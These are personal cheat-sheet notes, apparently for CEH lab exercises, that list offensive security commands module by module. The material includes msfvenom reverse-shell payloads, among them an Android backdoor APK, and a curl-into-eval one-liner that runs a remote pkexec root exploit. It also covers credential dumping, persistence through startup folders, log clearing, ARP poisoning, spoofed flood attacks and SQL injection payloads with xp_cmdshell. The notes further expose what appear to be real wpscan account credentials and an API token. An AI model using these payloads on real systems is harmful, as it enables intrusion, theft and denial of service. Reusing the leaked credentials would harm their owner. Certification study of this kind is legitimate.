
## Install This first (Prerequisite Tools )

>[!example] Prerequisite Tools
>- `sudo apt-get update & sudo apt-get upgrade`
>- `sudo apt install zsh zsh-autocomplete zsh-common zsh-autosuggestions zsh-syntax-highlighting`
>- `chsh -s $(which zsh)`  Then enter this to make your default shell as zsh and logout and logback in for changes to take effect
>- To update anyfile `sudo source [filename]`
 >- If  Ctrl+ Left/Right not working  add below lines to .zshrc
>	bindkey 'D (Key to Replace)' backward-word
>	bindkey 'C (Key to Replace)' forward-word
>- `Install sublime text deb file`
>- `Download deb file of AngryIP scanner `
>- `Make root user as default terminal - sudo su`
>- `sudo apt install nfs-common for getting showmount command`
>- `sudo apt install nfs-kernel-server`
 
<hr>

## Module 2 - Footprinting & Reconnaissance

### Passive Information Gathering

`Builtwith Extension` - To identify technologies used in the site
`whatweb -v [url]` - To identify technologies and other info.
`wafw00f` - To identify WAF
`robots.txt & sitemap.xml` / sitemaps.xml
`webhttrack` - To clone Website
https://search.censys.io/ <br>
###### Netcraft -- Provides DNS, which technologies being used and much more information about a website
https://sitereport.netcraft.com/
 
How Find the maximum frame size for the network?
> ping [website.com] –f –l 1472
 -l size Send buffer size.
 -f Set Don't Fragment flag in packet

 To find the minimum ttl accepted by the website

First run the tracert or traceroute on the target web server and identify the number of hops and take a note of it.
Now run the ping command by adding the switches -i ( ttl value) -n (number of pings)
Now put the value of hops which we got in the tracert in the -i switch , to get the min ttl accurately `OR` (Try changing the values slightly down until you get the minimum ttl accepted by the website)

###### Whois Enumeration

`whois [domain]`

###### DNS Recon

`dnsenum [domain]`

`dnsrecon -d [domain]`

###### Reverse IP Domain Check

`https://www.yougetsignal.com/tools/web-sites-on-web-server/`

https://dnsdumpster.com/

###### Subdomain Enumeration Tool- Passive/Active

```
subfinder -d [domain name]
```

`amass enum -passive -d [domain name] -src `

###### The Web Application Firewall (WAF) Fingerprinting Toolkit

`wafw00f [domain]`

###### Custom Worlist Using `cewl`
We can make custom wordlists from any webpage using a  tool called Cewl

```sh
cewl -w [output_file] -d[Level of crawling] -m [ minimum words we need in our wordlist] [domain_name]
```

###### Reverse IP Domain Check
https://www.yougetsignal.com/tools/web-sites-on-web-server/

###### IP Range Analyzer
https://www.arin.net/resources/registry/whois/  

###### OSINT Framework
https://osintframework.com/

###### Metadata Extraction using `FOCA` Tool

[Releases · ElevenPaths/FOCA (github.com)](https://github.com/ElevenPaths/FOCA/releases)

###### Enumeration using Metasploit :
>[!check] NMAP inside Metasploit
>msfdb init
>service postgresql start
>msfconsole
>msf > db_status
>nmap -Pn -sS -A -oX Test 10.10.10.0/24
>db_import Test
>hosts -> To show all available hosts in the subnet
>db_nmap -sS -A 10.10.10.16 -> To extract services of particular machine
>services -> to get all available services in a subnet

<hr>

## Module 3 - Scanning the network

### Active Information Gathering

``Do nmap pot scanning for snmp port 161 - if we get open port do script scanning and save the output file.``

###### Host DIscovery

`nmap -sn -PR/PE/PP/PM 192.168.1.0/24`

`Angry IP Scanner - ipscan`

`netdiscover -i [Interface]  -r [IP\Subnet]`

![img](https://i.postimg.cc/zfgBdYw9/screenshot-61.jpg)

###### Identify Host OS with TTL
![img](https://i.postimg.cc/zfS3yRNB/screenshot-62.jpg)

###### Scanning Networks

Port Scanning using Hping3:
`hping3 --scan 1-3000 -S 10.10.10.10`
--scan parameter defines the port range to scan and –S represents SYN flag

Pinging the target using HPing3:
`hping3 -c 3 10.10.10.10 -1`
-c 3 means that we only want to send three packets to the target machine.

UDP Packet Crafting
`hping3 10.10.10.10 --udp --rand-source --data 500`

TCP SYN request
`hping3 -S 10.10.10.10 -p 80 -c 5`
-S will perform TCP SYN request on the target machine, -p will pass the traffic through which port is assigned, and -c is the count of the packets sent to the Target machine.

HPing flood
`hping3 10.10.10.10 --flood`

<hr>

## Module 4 - Enumeration

``ping [ip]``

``nmap -Pn -p 1-65535 -A -T4 -vv [IP]``  /  ``nmap -Pn  -sU -p 53,161,389 -A -T4 -vv [IP]``

NMAP NSE Docs - https://nmap.org/nsedoc/scripts/


###### NetBIOS Enumeration  (139) 

> NetBIOS Enumeration : 
    nbtstat –A 10.10.10.16
    net use
    net use \10.10.10.16\e ““\user:””
    net use \10.10.10.16\e ““/user:””

- NetBIOS Enumerator Windows Application 

- nmap script --script=nbstat*


###### SNMP Enumeration (161)

``nmap –sU –p 161`` 
``nmap -sU -p 161 --script="snmp*" [IP]``

[SNMP](simplenote://note/ec74ed17-46e4-46f6-a7ca-4e8bad6d7bf2)

``snmp-check [ip]`` - List All Information about systems in  a network

``snmpwalk -c public -v1 [ip]`` 

> msfconsole
    use auxiliary/scanner/snmp/snmp_enum
    set RHOSTS and exploit
    use auxiliary/scanner/snmp/snmp_login
    set RHOSTS and exploit

    
###### LDAP Enumeration (389)

``Adexplorer``

OR 

Firstly, Login to the Windows machine via the given credentials and access the Local Users and Groups from Run Window(Win + R) and typing `lusrmgr.msc`


###### NFS Enumeration (389)

[NFS](simplenote://note/14f83f11-5d2a-43a6-bfbd-664378ca2a6f)

``nmap -p 2049 [ip] -sV -vv -T4``

``showmount -e [IP]``

###### DNS Enumeration (53)

``nmap -p 53 [ip] -sV -vv -T4 --script="dns*"``

Use Passive Info Gathering Tools

``use sudo while using dnsrecon``

###### SMTP Enumeration (25,2525,587)

[SMTP](simplenote://note/232bd847-4075-412a-9e83-5d917d84d7fb)

``nmap -p 25,2525,587 [ip] -sV -vv -T4 --script="smtp*"``


###### SMB Enumeration (137,138,139,445)

[SMB / Netbios](simplenote://note/a7be4b20-3063-46b1-a146-add58439a251)

use scanner/smb/smb_version
set RHOSTS 10.10.10.8-16
set THREADS 100
run
hosts -> now exact os_flavor information has been updated


###### FTP Enumeration (21)

[FTP](simplenote://note/51634c3e-9d22-4ca6-8483-a134ceadd00c)

``nmap -p 21 [ip] -sV -vv -T4 --script="ftp*"``

###### Enum4linux 

``enum4linux -a [ip]``

###### Nikto 

``nikto -h [domain/ip] -output [filename] -Format txt/xml/html``

<hr>

## Module 05 : Vulnerability Analysis

>[!check] Nikto & Nessus
>`nikto -h [ip / domain] -Tuning 1`
>Nessus runs on  https://localhost:8834
>Nessus -> Policies > Advanced scan
>Discovery > Host Discovery > Turn off Ping the remote host
>Port Scanning > check the Verify open TCP ports found by local port enumerators
>Advanced
>Max number of TCP sessions per host and = unlimited
>Max number of TCP sessions per scan = unlimited
>Credentials > Windows > Username & Password
>Save policy > Create new scan > User Defined
>Enter name & Target
>Schedule tab > Turn of Enabled
>Hit launch from drop-down of save

<hr>

## Module 06 : System Hacking

>[!important] File Sharing Between Machines using `apache2` server
>- mkdir /var/www/html/share
>- chmod -R 755 /var/www/html/share
>- chown -R www-data:www-data /var/www/html/share
>- cp [payload file] /var/www/html/share
>- service apache2 start

###### Responder
Extracts OS information, NTLM Password Hashes, NTLM Username, NTLM Ip Address, Client version
To start Responder:- 
`responder -I eth0`
 
 - Default location for storing logs - ` /home/responder/logs` pass this log file to JTR to crack the password using the given wordlist.
 - john `/usr/share/responder/logs/[file name of the logs.txt]`

###### Msfvenom Payload 
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=[IP] LPORT=[PORT Number] -f exe  --platform windows -a x86 -e x86/shikata_ga_nai -o [output file ]`

`run vnc` - To get VNC session in meterpreter session (Requires Root Privileges)

>[!check] Multihandler
>- use exploit/mutli/handler
>- set payload to what you have defined in msfvenom payload
>- Transfer the payload and run it
>- after getting the shell run the following commands:-
>- getuid
>- sysinfo
>- getsystem - check for privilege escaltion / bypass UAC
>- background sessions using `bg` command or `background`
https://null-byte.wonderhowto.com/how-to/bypass-uac-escalate-privileges-windows-using-metasploit-0196076/
>- if getsystem didn't worked use`bypassuac` or `bypassuac_fodhelper` exploit module
>- set payload to what you have defined in msfvenom payload
>- Now u will have the root user privileges
[Ultimate List of Meterpreter Commands](simplenote://note/39167abb-f1fe-4be1-a80b-fff229eabb8c)

`To get all information regarding privilege escalation use WinPEAS/LinPEAS`


###### Post Exploitation Tools

>[!check] MACE
>- M - Modified
>- A - Accessed
>- C - Created
>- E - Entry Modified
`timestomp [filename] -v`  :- To view MACE Information
`timestomp [filename] -m/-a/-c/-e  'date format | time format'`

To search any file in meterpreter session search -f [filename]

To retreive Hidden Directories
- Enter shell mode from meterpreter session

`dir /a:h`

![img](https://i.postimg.cc/T2mRsmMf/screenshot-97.jpg)

###### PKEXEC vulnerability to get root shell

git  clone https://github.com/berdav/CVE-2021-4034.git  
OR 
oneliner command `eval "$(curl -s https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/cve-2021-4034.sh)"`

Just execute make, `./cve-2021-4034` and enjoy your root shell

Dry Run
- To not execute a shell but just test if the system is vulnerable compile the dry-run target.
- If the program exit printing "root" it means that your system is vulnerable to the exploit.
- If your system is not vulnerable it prints an error and exit.

###### NFS Exploitation
`showmount -e [ip]`  
if found any share 
`mkdir /tmp/nfs`
`sudo mount -t nfs [ip]:/share /tmp/nfs`

###### Bypassing UAC & Exploiting Sticky Keys
- Get Meterpreter Root Shell usnign above mentioned steps
- Background the session
- Use module windows/manage/sticky_keys
- exploit

###### Escalate Privileges & Gather Hashdump
- Get Meterpreter Root Shell usnign above mentioned steps
- `load kiwi`
- `help kiwi`
- `lsa_dump_sam`
- `password_change -u [username] -n [old NTLM Hash] -P [new password]`

Hash dump with pwdump8 and crack with JTR

wmic useraccount get name,sid --> Get user acc names and SID
https://download.openwall.net/pub/projects/john/contrib/pwdump/pwdump8-8.2.zip
`pwdump8.exe > c:\hashes.txt`

###### Stegnography

WhiteSpace Stegnography
`sudo apt install stegsnow`

To Hide Data
`stegsnow -C  -m "String that u need to hide" -p "password"  [file1.txt(old_file)] [file2.txt (output_File)]`
https://manpages.ubuntu.com/manpages/bionic/man1/stegsnow.1.html

To Read Data
`stegsnow -C  -p "password" [filename.txt]`

OpenStego - Windows Stegnography Tool

###### Maintain Persistence by Abusing Boot Logon Autostart
- Make 2 payload file one for getting meterpreter session & second one for dumping the payload to startup folder
 "use different ports for different payloads"
- Get Meterpreter Root Shell usnign above mentioned steps
- Background the session
- Escalate Privileges
- Place the payload file to startup loction 

`C:\\ProgramData\\StartMenu\\Programs\\Startup`

`C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup`

- Restart the Windows Machine
- Get the Reverse Shell

###### Maintain Domain Persistence by Exploiting Active Directory Objects

######  Privilege Escalation Maintain Persistence using WMI

######  Covert Channels sing Covert_TCP
Download covert_tcp file 
>https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwisuI2Mirj8AhV4zzgGHanDDYAQFnoECAkQAQ&url=http%3A%2F%2Fwww-scf.usc.edu%2F~csci530l%2Fdownloads%2Fcovert_tcp.c&usg=AOvVaw2iAVfjGEAO5q-aAqYVps1d

1. compile the covert_tcp file

`cc -o covert_tcp covert_tcp.c`

2. Receiving Command

`./covert_tcp -source 192.168.1.108 -source_port 8888 -server -file [file_receive.txt]`

3. Send Command
	Make a text file to send
	`./covert_tcp -dest 192.168.1.100 -source 192.168.1.108 -source_port 9999 -dest_port 8888 -file [file_send.txt]`

######  Clear Logs to Hide Evidence
[CLEARING LOGS - Windows](simplenote://note/676ec02f-ed17-4ea0-8c7e-4c58d8b77c86)

---

## Module 08: Sniffing

###### Perform MAC flooding using macof

- `macof -i [interface] -n [no.of packets to be sent]`

- This command will start flooding the CAM table with random mac addresses.

- We can turn on wireshark and watch this random packets being sent from random mac addresses.

###### Perform DHCP Starvation attack using yersinia

- In DHCP starvation attack , an attacker floods the DHCP server by sending a large number of DHCP requests and uses all available IP addresses that DHCP server can issue. As a result the DHCP server cannot issue any more IP addresses , leading to a DOS attack.
- Type ``` yersinia -I ``` to start yersinia in interactive mode.
- To remove the notification window press any key
- Press h for help menu and press q to exit help menu.
- Press F2 to select DHCP mode.
- Press x to list available attack options
- select the options you want , (sending discover packets options is most widely used for DHCP starvation)
- Now yersinia will start sending the DHCP packets to all active machines of your LAN network.

###### Perform ARP Poisoning using arpspoof

- An ARP spoofing, also known as ARP poisoning, is a Man in the Middle (MitM) attack that allows attackers to intercept communication between network devices.
- We need to run arpspoof 2 times so that we can make the router believe that we are the target IP and in second attempt we make the target believe that we are the router IP.
- `arpspoof -i [interface] -t [target IP] [router default gateway IP]`

-  `arpspoof -i [interface] -t [router default gateway IP] [target IP]`

###### Spoof a mac address using mac changer(linux) , TMAC and SMAC(Windows)

`ifconfig eth0 down`
`macchanger -a eth0` to set a random vendor MAC address to the Network interface
`macchanger -r eth0` to set the random mac address
`macchanger -p eth0` to set the MAC address to its default value
At the end type `ifconfig eth0 up`

###### Wireshark analysis

- If we want to remotely monitor any network traffic for some other computer in our LAN network in our main attacking machine then we need to add the IP address and the login credentials of that machine to the remote interface tab located in capture options of wireshark (This option is available only in Windows version of wireshark)
- First we need to turn on one service named `Remote Packet Capture Protocol v.0`  in victim machine whose traffic we want to monitor remotely.
- To monitor the random flooding of arp requests we need to go to preferences and then go to protocols , then go to arp/rarp section and then turn on the option `detect arp request storms`
- Using wireshark we can obtain the credentials of the target system whom we are monitoring if the user on that system enters any credentials on a http website (plaintext)
- We can use the filter `http.request.method == POST`

- To Detect a sniffer which is in promiscous mode in our LAN network we can use NMAP nse script named `sniffer-detect`
---
## Module 10: Dos/DDOS

###### Hping3

- `sudo hping3 -S [Target Ip] -a [Spoofed IP] -p [any open port] --flood`

- `sudo hping3 -d 65538 -S [Target Ip] -a [Spoofed IP] -p [any open port] --flood`

- `sudo hping3 --udp [Target Ip] -a [Spoofed IP] -p [any open port] --flood`

- For more info , refer this [ Hping3](simplenote://note/55211299-892a-444e-b56b-b4423a95688a)

- We can also use msf module named `synflood` to perform dos attack and spoofing IP address.
---
## Module 13: Hacking web Server

###### Banner Grabbing

`curl -i -s [url]`

`wget -q -S 162.241.216.11`

`nc [url] [port]`

`telnet [url] [port]`

Bruteforcing FTP
`hydra  -L [userlList.txt] -P [wordlist.txt] -vV [MACHINE_IP] ftp|smb|ssh|ldap`

NMAP NSE Scripts

`--script="http-enum"` :- Enumeration of Tragetd Website

`--script="https-waf-detect"` :- WebApplicationFirewall Detection 

`--script="http-trace"` :- This script will detect vulnerable server that uses TRACE method by sending an HTTP TRACE request that shows if the method is enabled or not

`--script="hostmap-bfk" -script-args="hostmap-bfk.prefix=hostmap-"`

---

## Module 14: Hacking Web  Application

### Web App Reconn using Nmap & telnet

`nmap -A -p- -T4 -v [IP]`

`curl [url]`

`whatweb -v [url]` - To identify technologies and other info

`OWASP ZAP - Automated Attack`

`lbd [url] `

### Identify Directories

- `gobuster dir -u http://10.10.230.124/ -w /usr/share/wordlists/dirb/common.txt 2 >/dev/null`
- `gobuster dir -u http://10.10.230.124/ -x txt,html,php,aspx,js -w /usr/share/wordlists/dirb/common.txt 2 > /dev/null`  → Enumerating Directory with Specific Extension List
- `gobuster dir -u http://10.10.230.124/dvwa -w /usr/share/wordlists/dirb/common.txt -o output.txt 2 >/dev/null`

### Web App Attack 

###### Web App Attack using BurpSuite
>[!note] BurpSuite Intruder
Login using any credentials --> Intercept Request -->   Send to Intruder --> 
Clear $ button -->  Select Username & Password and Click on Add $ --> 
Select Cluster Bomb --> 
Under payload tab set payload set to 1  and payload type simplelist and then load payload under payload options  userlist & set payload set to 2  and payload type simplelist and then load payload under payload option for passwords --> 
Click on Start Attack --> 
Observe the different value of Status Code & Length

###### Web App Attack using Parameter Tampering 

Change id Parameter using Burpsuite --> Inspector tab or by using `?id=[value]` in the url

###### Identifying XSS Attack by using PwnXss

https://github.com/pwn0sec/PwnXSS

###### Exploiting XSS Attack & Parameter tampering

```js
<script>alert("Hello World")</script>
```
`?id=[value] in the url`

###### Perform CSRF Attack

**Wordpress**

wpscan api token account creds
- username - pheonixandbreach@protonmail.com
- password - pheonixandbreach123!
API Token - jMupXTlQNAwTSV4XCqZfRjN2iKkoO7QWy0ed0VcIvAk

- `wpscan --url IP --enumerate u`
- `wpscan --url IP --enumerate u`
- `wpscan --url http://IP/wp-login.php --usernames username --passwords /usr/share/wordlists/rockyou.txt --max-threads 50`
- https://www.poftut.com/how-to-scan-wordpress-sites-with-wpscan-tutorial-for-security-vulnerabilities/
- https://blog.sucuri.net/2021/05/wpscan-how-to-scan-for-wordpress-vulnerabilities.html

`wpscan --url http://10.10.10.12:8080/CEH --api-token [api_token] --plugins-detection aggressive --enumerate u,vp --random-user-agent -v`

WP Password Bruteforce Using Metasploit
 
msfconsole
`use auxiliary/scanner/http/wordpress_login_enum`

###### DVWA - File Upload Vulnerability

- `msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.108 LPORT=4444 -f raw -o php_payload.php`
- use exploit/mutli/handler
- upload this payload to the dvwa file_inclusion
	1) Directly Upload payload `.php` file  ---> `Low Security`
	2) Rename the payload to `.jpeg` or `.png` and click uplaod on DVWA -->  capture upload request in Burpsuite rename it and click forward to upload the payload. --> `Medium Security`
	3) Add `GIF98` keyword at the top of the payload file --> Then Rename the payload  file into .jepg and upload it on DVWA --> Using Command Injection rename the file extension `| type or mv [path to file] [new filename]` to `.php` and click submit. --> `High Security`

###### Log4J Vulnerability

https://github.com/kozmer/log4j-shell-poc

>[!check] Log4j Vulnerability 
>`sudo apt install docker.io`
>git clone https://github.com/kozmer/log4j-shell-poc.git
>`docker build -t log4j-shell-poc .`
>`docker run --network host log4j-shell-poc`
>Access it on http://ip:8080
>Download Java JDK-8u202 https://www.oracle.com/in/java/technologies/javase/javase8-archive-downloads.html
>Extract the file 
>![](https://i.imgur.com/EDpdgWK.png)
![](https://i.imgur.com/KeFK5IY.png)
![](https://i.imgur.com/2FQijNu.png)
![](https://i.imgur.com/FomIJEk.png)
![](https://i.imgur.com/xYXcHx0.png)
![](https://i.imgur.com/tSnsrwB.png)
![](https://i.imgur.com/eIHvZqn.png)



###### Clickjacpoc

Clickjacpoc - https://github.com/Raiders0786/ClickjackPoc

###### Commadn Injection RCE
ping 127.0.0.1 | hostname | net user


## Module 15: SQL Injection 

### SQLMAP Extract DBS
sqlmap -u “http://www.moviescope.com/viewprofile.aspx?id=1” --cookie="xookies xxx" --dbs
###### Extract Tables
sqlmap -u “http://www.moviescope.com/viewprofile.aspx?id=1” --cookie="cookies xxx" -D moviescope --tables
###### Extract Columns
sqlmap -u “http://www.moviescope.com/viewprofile.aspx?id=1” --cookie="cookies xxx" -D moviescope -T User_Login --columns
###### Dump Data
sqlmap -u “http://www.moviescope.com/viewprofile.aspx?id=1” --cookie="cookies xxx" -D moviescope -T User_Login --dump
###### OS Shell to execute commands
sqlmap -u “http://www.moviescope.com/viewprofile.aspx?id=1” --cookie="cookies xxx" --os-shell
###### Login bypass
blah' or 1=1 --
###### Insert data into DB from login
blah';insert into login values ('john','apple123');
###### Create database from login
blah';create database mydatabase;
###### Execute cmd from login
blah';exec master..xp_cmdshell 'ping www.moviescope.com -l 65000 -t'; --

### Low SQLMAP

 `sqlmap -u "http://192.168.1.111:8001/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=6f68acb14482d2b591b30f6bf4cba763;security=low" -p id -v --dbs`

### Medium SQLMAP

`sqlmap -u "http://192.168.1.107:8001/vulnerabilities/sqli/#"  --cookie="PHPSESSID=59d6f8d0984c4563d68cdbfa2bb6ccbf;security=medium" --data="id=1&Submit=Submit" -p id --random-agent -v  --dbs`

### High SQLMAP
`sqlmap -u "http://192.168.1.111:8001/vulnerabilities/sqli/session-input.php" --cookie="PHPSESSID=6f68acb14482d2b591b30f6bf4cba763;security=high" --data="id=1&Submit=Submit" -p id --second-url http://192.168.1.111:8001/vulnerabilities/sqli/ --dbs --flush-session`

## Module 17: Hacking Mobile Platforms

###### Hack an Android device by creating binary payloads using metasploit
>[!check] Using Binary Payloads
>- Using metasploit to creaate binary payloads to gain control of a use's phone
>- `service postgresql start`
>- `msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik LHOST=[IP]  LPORT=4444 R > Desktop/Backdoor.apk`
>- Share the backdoor file with the host. Start up meterpeter
>- use exploit/multi/handler
>	- `set payload android/meterpreter/reverse_tcp` and press Enter
>	- `set LHOST 10.10.1.13`
>	- `exploit`
>- Open the program on the client
>- Back on the meterpreter select session 1 and your in!

###### Hack the Android platform through ADB using PhoneSploit
>[!check] Using PhoneSploit
>- Android Debug Bridge (ADB) is a versatile command-line tool that lets you communicate with a device. 
>- ADB facilitates a variety of device actions such as installing and debugging apps, and provides access to a Unix shell that you can use to run several different commands on a device.
>- Developers connect to ADB on Android devices by using a USB cable, but it is also possible to do so wirelessly by enabling a daemon server at TCP port 5555 on the device.
>	- `cd PhoneSploit Directory`
>	- `python3 -m pip install colorama`
>	- `python3 phonesploit.py`
>		- Press 3: connect a new phone
>		- Enter the Phone's IP- connects to phone on port 5555
>		- Press 4 : to access shell 
>		- Find a file that you would like to download/take
>		- exit
>		- press 7: screen shot a picture of the phone  
>		- press 14: displaying the installed apps on the target Android device
>		- press 15: to open any apps
>		- com.android.calculator2
>		- p
>			- Navigates to additional tools
>			- Press 18 :shows interface 
>			- 21 Netstat
>			- press 9 to download

> Using ADB
	adb connect 192.168.0.4:5555
	adb devices -l
	adb shell
	cd SD Card
	ls 
	cat file.txt

## Module 20: Cryptography

### Encrypt the information

###### HashCalc
Windows exe
Performs multiple hashes/checksums against a file/text/hexstring
			
###### MD5 Calculator
Windows exe
Generates MD5 checksum of LARGE files
      
###### HashMyFiles
Supports MD5 and SHA1
      
###### CryptoForge /CryptTool
Window exe
Text/file encryption
File encryption software- right click on a software(app needs to be running)
			
###### BCTextEncoder
Windows exe
Compresses/encrypts/ converts to text format


<hr>

## Misc. 

### Wireless Networks
###### Crack a WEP network using Aircrack-ng
	§`aircrack-ng [pcap file]`
	By issuing the above command aircrack-ng will crack the WEP key of the CEHLabs

###### Crack a WPA2 network using Aircrack-ng
	$`aircrack-ng -a2 -b [Target BSSID] -w [password_Wordlist.txt] [WP2 PCAP file]``
	-a is the technique used to crack the handshake, 2=WPA technique.
	-b refers to bssid; replace with the BSSID of the target router.
	-w stands for wordlist; provide the path to a wordlist.
<hr>

### Cloud Computing

### S3 bucket enumeration 
###### Llazys3
>[!check] Llazys3
>- § lazys3 is a Ruby script tool that is used to brute-force AWS S3 buckets using different permutations.
>- § This tool obtains the publicly accessible S3 buckets and also allows you to search the S3 buckets of a specific company by entering the company name.
>- $cd lazys3-master
>- $`ruby lazys3.rb`
>- $`ruby lazys3.rb [company name]``
	
###### S3Scanner
This tool obtains the publicly accessible S3 buckets and also allows you to search the S3 buckets of a specific company by entering the company name.
>[!check] S3Scanner
>- $cd S3Scaner
>- $`pip3 install -r requirements.txt`
>- $`python3 ./s3scanner.py site.txt`
>- sites.txt is a text file containing the target website URL that is scanned for open S3 buckets. You can edit the sites.txt file to enter the target website URL of your choice
>- $`python3 ./s3scanner.py --include-closed --out-file found.txt --dump names.txt`
>- Dump all open buckets and log both open and closed buckets in found.txt
>- $`python3 ./s3scanner.py names.txt`
>- Just log open buckets in the default output file (buckets.txt)
>- $`python ./s3scanner.py --list names.txt`
>- Save the file listings of all open buckets to a file
